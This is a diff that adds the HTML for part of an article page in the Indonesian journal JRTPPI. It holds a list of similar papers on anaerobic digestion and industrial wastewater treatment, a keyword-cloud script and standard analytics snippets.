+									</li>
+											
+				<li>
+											Hanny Vistanti,
+											Rizal Awaludin Malik,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/37">
+						Enhanced Performance Of Multi-Stage Anaerobic Digestion Of Tofu Wastewater: Role Of Recirculation
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/12">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 10 No. 1 (2019)
+					</a>
+									</li>
+											
+				<li>
+											Novarina Irnaning Handayani,
+											Nanik Indah Setianingsih,
+											Misbachul Moenir,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/60">
+						Performance of Immobilized-Selected Microorganisms in The Biodegradation of Textile Industry Waste Water
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/10">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 9 No. 1 (2018)
+					</a>
+									</li>
+											
+				<li>
+											Zulkarnaini Zulkarnaini,
+											Ansiha Nur,
+											Wina Ermaliza,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/2">
+						Nitrogen Removal in the Anammox Biofilm Reactor using Palm Fiber as Carrier in Tropical Temperature Operation
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/1">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 10 No. 2 (2019)
+					</a>
+									</li>
+											
+				<li>
+											Hanny Vistanti,
+											Rizal Awaludin Malik,
+											Aris Mukimin,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/75">
+						Performance of a Full-Scale Anaerobic Digestion on Bakery Wastewater Treatment : Effect of Modified Distribution System
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/13">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 11 No. 1 (2020)
+					</a>
+									</li>
+											
+				<li>
+											Iqbal Syaichurrozi,
+											M. Fakhri  Basyir,
+											Rafi Muhammad  Farraz,
+											Putri Kurnia  Villta,
+											Nabilah  Nabilah,
+											Rusdi  Rusdi,
+											Sutaryo  Sutaryo,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/122">
+						The effect of Inoculum to Substrate and Carbon to Nitrogen Ratios on the Biogas Quantity and Quality from Anaerobic Digestion of Salvinia molesta: Experimental and Kinetic Studies
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/17">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 13 No. 1 (2022)
+					</a>
+									</li>
+											
+				<li>
+											Novarina Irnaning Handayani,
+											Rustiana Yuliasni,
+											Nanik Indah Setianingsih,
+											Agung Budiarto,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/77">
+						Full Scale Application of Integrated Upflow Anaerobic Filter (UAF)-Constructed Wetland (CWs) in Small Scale Batik Industry Wastewater Treatment
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/13">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 11 No. 1 (2020)
+					</a>
+									</li>
+											
+				<li>
+											Djarwanti Djarwanti,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/49">
+						APLIKASI PENGOLAHAN AIR LIMBAH INDUSTRI TAPIOKA DENGAN SISTIM ABR DAN UAF
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/4">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 6 No. 1 (2015)
+					</a>
+									</li>
+											
+				<li>
+											Naomi Aurora Margareth Br  Simanjuntak,
+											Nurulbaiti Listyendah  Zahra,
+											I Wayan Koko Suryawan,
+										<a href="https://jrtppi.id/index.php/jrtppi/article/view/131">
+						Decision Making for Biological Tofu Wastewater Treatment to Improve Quality Wastewater Treatment Plant (WWTP) Using Analytical Hierarcy Process (AHP)
+					</a>
+					,
+					<a href="https://jrtppi.id/index.php/jrtppi/issue/view/17">
+						Jurnal Riset Teknologi Pencegahan Pencemaran Industri: Vol. 13 No. 1 (2022)
+					</a>
+									</li>
+					</ul>
+		<p id="articlesBySimilarityPages">
+			<strong>1</strong>&nbsp;<a href="https://jrtppi.id/index.php/jrtppi/article/view/31?articlesBySimilarityPage=2#articlesBySimilarity">2</a>&nbsp;<a href="https://jrtppi.id/index.php/jrtppi/article/view/31?articlesBySimilarityPage=2#articlesBySimilarity">&gt;</a>&nbsp;<a href="https://jrtppi.id/index.php/jrtppi/article/view/31?articlesBySimilarityPage=2#articlesBySimilarity">&gt;&gt;</a>&nbsp;
+		</p>
+		<p id="articlesBySimilaritySearch">
+						You may also <a href="https://jrtppi.id/index.php/jrtppi/search/search?query=anaerobic%20microaeration%20vinasse">start an advanced similarity search</a> for this article.
+		</p>
+	</div>
+<div id="articlesBySameAuthorList">
+				</div>
+
+
+</div><!-- .page -->
+
+	</div><!-- pkp_structure_main -->
+
+									<div class="pkp_structure_sidebar left" role="complementary" aria-label="Sidebar">
+				<div class="pkp_block block_custom" id="customblock-menu-bar-new">
+	<h2 class="title pkp_screen_reader">Menu Bar New</h2>
+	<div class="content">
+		<p><a title="Submission" href="https://jrtppi.id/index.php/jrtppi/about/submissions"><img src="https://jrtppi.id/public/site/images/admin/submission-logo.jpg" alt="" width="320" height="64"></a></p>
+<div class="content">
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: #e4ae0c; color: #e4ae0c;"><strong><span style="font-weight: bold;"><span style="color: white;">Additional Menu</span></span></strong></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-file-text">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/scope">Focus and Scope</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-line-chart">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/frequency">Publication Frequency</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-commenting">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/reviewprocess">Peer Review Process</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-copy">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/openaccess">Open Access Policy</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-graduation-cap">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/ethic">Publication Ethics</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-copyright">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/copyright">Copyright &amp; License</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-copy">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/manuscript">Manuscript Preparation</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-money">&nbsp;</em><a href="https://jrtppi.id/index.php/jrtppi/authorfee"> Articles Processing Charge</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-file-text">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/aguide">Author Guidelines</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-sitemap">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/indexing">Indexing &amp; Abstraction</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-info-circle">&nbsp;</em> <a href="https://jrtppi.id/index.php/jrtppi/pp">Plagiarism Policy</a></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: #b68b09;"><em class="fa fa-address-book">&nbsp;</em> <a href="https://statcounter.com/p12217316/?guest=1" target="_blank" rel="noopener">Visitor</a></div>
+</div>
+	</div>
+</div>
+<div class="pkp_block block_custom" id="customblock-template-new">
+	<h2 class="title pkp_screen_reader">Template new</h2>
+	<div class="content">
+		<div class="content">
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: #e4ae0c; color: #e4ae0c;"><strong><span style="font-weight: bold;"><span style="color: white;">Download</span></span></strong></div>
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: white; color: darkgreen;"><a href="https://docs.google.com/document/d/1QDeCt9PMmCqQWJetcale3eSx9f4tVATI/edit?usp=sharing&amp;ouid=104137120590999421944&amp;rtpof=true&amp;sd=true" target="_blank" rel="noopener"><img src="https://jrtppi.id/public/site/images/admin/journal-template-.png" alt="" width="160" height="63"></a></div>
+</div>
+	</div>
+</div>
+<div class="pkp_block block_custom" id="customblock-visitor-new">
+	<h2 class="title pkp_screen_reader">visitor new</h2>
+	<div class="content">
+		<div class="content">
+<div style="padding: 8px; border-bottom: 1px solid #e4ae0c; background: #e4ae0c; color: #e4ae0c;"><strong><span style="font-weight: bold;"><span style="color: white;">Visitor Statistic</span></span></strong></div>
+<div style="padding: 8px; border-bottom: 1px solid #696969; background: white; color: darkgreen;">
+<p><a href="https://info.flagcounter.com/mWAO"><img src="https://s05.flagcounter.com/count2/mWAO/bg_FFFFFF/txt_000000/border_CCCCCC/columns_2/maxflags_15/viewers_3/labels_1/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0"></a></p>
+<p><a title="Web Analytics" href="https://statcounter.com/" target="_blank" rel="noopener"><img src="https://c.statcounter.com/12217316/0/3146c018/0/" alt="Web Analytics"></a></p>
+<p><a href="https://statcounter.com/p12217316/?guest=1" target="_blank" rel="noopener">View JRTPPI Stats</a></p>
+</div>
+</div>
+	</div>
+</div>
+<div class="pkp_block block_information">
+	<h2 class="title">Information</h2>
+	<div class="content">
+		<ul>
+							<li>
+					<a href="https://jrtppi.id/index.php/jrtppi/information/readers">
+						For Readers
+					</a>
+				</li>
+										<li>
+					<a href="https://jrtppi.id/index.php/jrtppi/information/authors">
+						For Authors
+					</a>
+				</li>
+										<li>
+					<a href="https://jrtppi.id/index.php/jrtppi/information/librarians">
+						For Librarians
+					</a>
+				</li>
+					</ul>
+	</div>
+</div>
+<div class="pkp_block block_browse">
+	<h2 class="title">
+		Browse
+	</h2>
+
+	<nav class="content" role="navigation" aria-label="Browse">
+		<ul>
+							<li class="has_submenu">
+					Categories
+					<ul>
+													<li class="category_4">
+								<a href="https://jrtppi.id/index.php/jrtppi/catalog/category/Material_fabrication">
+									Material fabrication
+								</a>
+							</li>
+													<li class="category_5">
+								<a href="https://jrtppi.id/index.php/jrtppi/catalog/category/Energy_Conservation">
+									Energy Conservation 
+								</a>
+							</li>
+													<li class="category_2">
+								<a href="https://jrtppi.id/index.php/jrtppi/catalog/category/technology">
+									Process technology and simulation
+								</a>
+							</li>
+													<li class="category_3">
+								<a href="https://jrtppi.id/index.php/jrtppi/catalog/category/Design_Engineering">
+									Design Engineering
+								</a>
+							</li>
+													<li class="category_1">
+								<a href="https://jrtppi.id/index.php/jrtppi/catalog/category/Environmental_Technology">
+									Environmental Technology
+								</a>
+							</li>
+											</ul>
+				</li>
+					</ul>
+	</nav>
+</div><!-- .block_browse -->
+<div class="pkp_block block_Keywordcloud">
+	<h2 class="title">Keywords</h2>
+	<div class="content" id='wordcloud'></div>
+
+	<script>
+		function randomColor() {
+			var colors = ['#1f77b4', '#ff7f0e', '#2ca02c', '#d62728', '#9467bd', '#8c564b', '#e377c2', '#7f7f7f', '#bcbd22', '#17becf'];
+			return colors[Math.floor(Math.random()*colors.length)];
+		}
+
+					document.addEventListener("DOMContentLoaded", function() {
+				var keywords = [{"text":"leachate","size":1},{"text":"frekuensi","size":1},{"text":"phenol","size":1},{"text":"oil","size":1},{"text":"denitrifying bacteria","size":1},{"text":"mining waste","size":1},{"text":"thiocyanate","size":1},{"text":"profil rambat getaran","size":1},{"text":"matlab","size":1},{"text":"waste reagent laboratory","size":1},{"text":"hvas modifikasi","size":1},{"text":"partikulat","size":1},{"text":"portabel","size":1},{"text":"fotokatalisis","size":1},{"text":"h2o2","size":1},{"text":"air limbah indigo","size":1},{"text":"electrocatalytic","size":1},{"text":"hazardous","size":1},{"text":"minyak dan lemak","size":1},{"text":"efisiensi","size":1},{"text":"corrosion","size":1},{"text":"inhibitor","size":1},{"text":"theobroma cacao peel","size":1},{"text":"mild steel","size":1},{"text":"potensiodinamic","size":1},{"text":"effluent ipal","size":1},{"text":"vssf dan hssf wetland","size":1},{"text":"nitrosomonas","size":1},{"text":"cell-wall disruption","size":1},{"text":"chlorella","size":1},{"text":"catalytic ozonation","size":1},{"text":"agricultural wastewater","size":1},{"text":"biotransformation","size":1},{"text":"nitrogen","size":1},{"text":"nitrobacter","size":1},{"text":"tio2\/ti","size":1},{"text":"gravimetri","size":1},{"text":"lateks","size":1},{"text":"elektroda emas","size":1},{"text":"high performance","size":1},{"text":"bio-enzymatic","size":1},{"text":"sago palm fiber waste","size":1},{"text":"bioethanol","size":1},{"text":"biosensor bod","size":1},{"text":"rhodotorula mucilaginosa","size":1},{"text":"lingkungan","size":1},{"text":"palm fiber","size":1},{"text":"fly ash batubara","size":1},{"text":"nano clay","size":1},{"text":"fe dan mn","size":1}];
+				var totalWeight = 0;
+				var width = 300;
+				var height = 200;
+				var transitionDuration = 200;
+				var length_keywords = keywords.length;
+				var layout = d3.layout.cloud();
+
+				layout.size([width, height])
+					.words(keywords)
+					.fontSize(function(d)
+					{
+						return fontSize(+d.size);
+					})
+					.on('end', draw);
+
+				var svg = d3.select("#wordcloud").append("svg")
+					.attr("viewBox", "0 0 " + width + " " + height)
+					.attr("width", '100%');
+
+				function update() {
+					var words = layout.words();
+					fontSize = d3.scaleLinear().range([16, 34]);
+					if (words.length) {
+						fontSize.domain([+words[words.length - 1].size || 1, +words[0].size]);
+					}
+				}
+
+				keywords.forEach(function(item,index){totalWeight += item.size;});
+
+				update();
+
+				function draw(words, bounds) {
+					var w = layout.size()[0],
+						h = layout.size()[1];
+
+					scaling = bounds
+						? Math.min(
+							w / Math.abs(bounds[1].x - w / 2),
+							w / Math.abs(bounds[0].x - w / 2),
+							h / Math.abs(bounds[1].y - h / 2),
+							h / Math.abs(bounds[0].y - h / 2),
+						) / 2
+						: 1;
+
+					svg
+					.append("g")
+					.attr(
+						"transform",
+						"translate(" + [w >> 1, h >> 1] + ")scale(" + scaling + ")",
+					)
+					.selectAll("text")
+						.data(words)
+					.enter().append("text")
+						.style("font-size", function(d) { return d.size + "px"; })
+						.style("font-family", 'serif')
+						.style("fill", randomColor)
+						.style('cursor', 'pointer')
+						.style('opacity', 0.7)
+						.attr('class', 'keyword')
+						.attr("text-anchor", "middle")
+						.attr("transform", function(d) {
+							return "translate(" + [d.x, d.y] + ")rotate(" + d.rotate + ")";
+						})
+						.text(function(d) { return d.text; })
+						.on("click", function(d, i){
+							window.location = "https://jrtppi.id/index.php/jrtppi/search?query=QUERY_SLUG".replace(/QUERY_SLUG/, encodeURIComponent(''+d.text+''));
+						})
+						.on("mouseover", function(d, i) {
+							d3.select(this).transition()
+								.duration(transitionDuration)
+								.style('font-size',function(d) { return (d.size + 3) + "px"; })
+								.style('opacity', 1);
+						})
+						.on("mouseout", function(d, i) {
+							d3.select(this).transition()
+								.duration(transitionDuration)
+								.style('font-size',function(d) { return d.size + "px"; })
+								.style('opacity', 0.7);
+						})
+						.on('resize', function() { update() });
+				}
+
+				layout.start();
+
+			});
+			</script>
+</div>
+
+			</div><!-- pkp_sidebar.left -->
+			</div><!-- pkp_structure_content -->
+
+<div class="pkp_structure_footer_wrapper" role="contentinfo">
+	<a id="pkp_content_footer"></a>
+
+	<div class="pkp_structure_footer">
+
+		
+		<div class="pkp_brand_footer" role="complementary">
+			<a href="https://jrtppi.id/index.php/jrtppi/about/aboutThisPublishingSystem">
+				<img alt="More information about the publishing system, Platform and Workflow by OJS/PKP." src="https://jrtppi.id/templates/images/ojs_brand.png">
+			</a>
+		</div>
+	</div>
+</div><!-- pkp_structure_footer_wrapper -->
+
+</div><!-- pkp_structure_page -->
+
+<script src="https://jrtppi.id/lib/pkp/lib/vendor/components/jquery/jquery.min.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/lib/pkp/lib/vendor/components/jqueryui/jquery-ui.min.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/themes/default/js/lib/popper/popper.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/themes/default/js/lib/bootstrap/util.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/themes/default/js/lib/bootstrap/dropdown.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/themes/default/js/main.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/generic/citationStyleLanguage/js/articleCitation.js?v=3.3.0.22" type="text/javascript"></script><script src="https://jrtppi.id/plugins/generic/citations/js/citations.js?v=3.3.0.22" type="text/javascript"></script><script src="https://d3js.org/d3.v4.js?v=3.3.0.22" type="text/javascript"></script><script src="https://cdn.jsdelivr.net/gh/holtzy/D3-graph-gallery@master/LIB/d3.layout.cloud.js?v=3.3.0.22" type="text/javascript"></script><script type="text/javascript">
+(function (w, d, s, l, i) { w[l] = w[l] || []; var f = d.getElementsByTagName(s)[0],
+j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; 
+j.src = 'https://www.googletagmanager.com/gtag/js?id=' + i + dl; f.parentNode.insertBefore(j, f); 
+function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', i); })
+(window, document, 'script', 'dataLayer', '166298054');
+</script>
+
+
+</body>
+</html>
